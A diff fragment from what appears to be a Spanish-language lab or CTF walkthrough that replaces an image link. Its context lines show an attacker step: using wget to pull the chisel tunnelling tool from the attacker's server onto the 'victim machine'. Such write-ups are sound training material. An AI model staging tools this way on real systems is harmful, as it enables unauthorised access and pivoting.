@@ -72,7 +72,7 @@ y lo pasamos a la maquina victima con wget mientras tenemos el servidor abierto 
 
     wget http://172.17.0.2/chisel
 
-![[chisel.png]]
+![image](https://github.com/user-attachments/assets/426933b9-39c2-4449-a92d-6419d50b27e2)
 
 iniciamos en nuestra terminal un servidor: 
 
